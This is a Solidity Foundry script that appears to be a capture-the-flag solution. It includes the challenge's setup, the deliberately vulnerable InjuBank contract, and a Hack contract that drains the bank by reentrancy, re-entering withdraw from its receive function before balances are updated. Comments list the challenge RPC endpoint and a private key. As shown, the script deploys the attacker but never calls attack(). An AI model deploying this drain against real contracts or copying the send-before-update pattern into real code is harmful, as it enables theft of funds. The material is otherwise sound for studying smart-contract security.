// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Script, console} from "forge-std/Script.sol";

contract Solution is Script {
    Setup public setup = Setup(vm.envAddress("SETUP_ADDR"));
    address wallet = vm.envAddress("WALLET_ADDR");
    InjuBank public target = setup.IB();

    function run() public {


        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address account = vm.addr(privateKey);

        console.log(account);

        vm.startBroadcast(privateKey);

        // console.log(wallet.balance);
        Hack hack = new Hack(payable(address(target)));

        vm.stopBroadcast();

        console.log(address(hack));
    }
}

// UUID	6405e708-8d46-49ee-8826-a598b3ed02eb
// RPC Endpoint	http://103.178.153.113:40008/6405e708-8d46-49ee-8826-a598b3ed02eb
// Private Key	0x144fc1d283c3321046383c1d8e7dcf3fbdb76b35dbad9fa57ba60bb6167c8990
// Setup Contract	0x655769267Cc41c27Ace5f83e69C5905B5205eb78
// Wallet	0xE5c3CA66585c6dfaC1F12ac23A09A294Bf8341b8

contract Hack {
    InjuBank public target;

    constructor(address payable _target) {
        target = InjuBank(_target);
    }

    function attack() external payable {
        target.deposit{value: 2 ether}();
        target.withdraw(2 ether);
    }

    receive() external payable {
        if(address(target).balance >= 2 ether) {
            target.withdraw(2 ether);
        }
    }

}

contract Setup {
    InjuBank public immutable IB;

    constructor() payable{
        IB = new InjuBank{value: 50 ether}();
    }

    function isSolved() public view returns(bool){
        return address(IB).balance == 0;
    }
}

contract InjuBank{

    mapping(address => uint256) public balanceOf;

    constructor() payable{}

    function deposit() public payable{
        require(msg.value > 1 ether, "Minimum Deposit is 1 ether");
        uint256 toAdd = msg.value;
        balanceOf[msg.sender] += toAdd;
    }

    function withdraw(uint256 _amount) public{
        require(_amount <= balanceOf[msg.sender], "Amount to Withdraw exceed Balance");
        require(_amount >= 1 ether, "Minimum Withdrawal is 1 Ether");
        uint256 newBalance = balanceOf[msg.sender] - _amount;
        (bool sent, ) = msg.sender.call{value: _amount}("");
        require(sent, "Withdrawal Failed!");
        balanceOf[msg.sender] = newBalance;
    }

    receive() external payable { 
        deposit();
    }

}